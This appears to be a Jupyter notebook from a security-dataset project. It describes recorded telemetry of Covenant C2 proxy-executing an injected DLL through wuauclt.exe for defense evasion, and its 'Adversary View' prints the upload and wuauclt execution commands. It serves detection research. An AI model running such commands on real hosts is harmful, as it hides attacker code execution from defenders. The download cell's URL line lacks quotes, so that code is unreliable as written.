{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9de02af4",
   "metadata": {},
   "source": [
    "# Covenant Wuauclt CreateRemoteThread Execution"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d5cebec",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90872f62",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/12 |\n",
    "| Modification Date | 2020/10/12 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1218](https://attack.mitre.org/techniques/T1218) |\n",
    "| Tags              | CreateRemoteThread |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "40f3570b",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries proxy executing code via the Windows Update client utility. In order to bypass rules looking for the binary reaching out directly to the Internet, this dataset shows the binary creating and running a thread in the virtual address space of another process via the CreateRemoteThread API."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "339b2752",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ea96d171",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/covenant_lolbin_wuauclt_createremotethread.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/covenant_lolbin_wuauclt_createremotethread.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7224daf2",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1e69f489",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74b3801e",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Covenant | [ShellCmd](https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Tasks/SharpSploit.Execution.yaml#L96) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "85cd7d92",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Upload /filepath:\"C:\\ProgramData\\SimpleInjection.dll\"\n",
    "\n",
    "ShellCmd /shellcommand:\"C:\\Windows\\System32\\wuauclt.exe /UpdateDeploymentProvider C:\\ProgramData\\SimpleInjection.dll /RunHandlerComServe\"\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6190349a",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5003b933",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1dcae32",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/covenant_lolbin_wuauclt_createremotethread.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a797bd23",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "89616640",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8146fa44",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e149402a",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dfa5741f",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://dtm.uk/wuauclt/](https://dtm.uk/wuauclt/) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
